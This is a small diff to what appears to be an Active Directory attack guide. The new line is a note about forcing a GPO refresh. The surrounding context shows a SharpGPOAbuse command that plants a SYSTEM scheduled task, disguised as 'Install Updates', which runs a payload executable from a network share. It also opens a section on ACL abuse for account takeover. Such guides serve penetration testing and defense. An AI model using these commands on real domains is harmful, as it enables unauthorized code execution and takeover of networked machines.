@@ -718,6 +718,8 @@ Example of adding an Immediate Scheduled Task too the PowerShell Logging GPO.
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "%COMSPEC%" --Arguments "/b /c start /b /min \\srv\share\payload.exe" --GPOName "PowerShell Logging"
 ```
 
+> **Note**: We can wait to the GPO refresh or manually run `gpupdate /force` on the target.
+
 # Abusing ACLs
 
 There may be instances across the domain where some principals have ACLs on more privileged accounts, that allow them to be abused for account-takeover. 
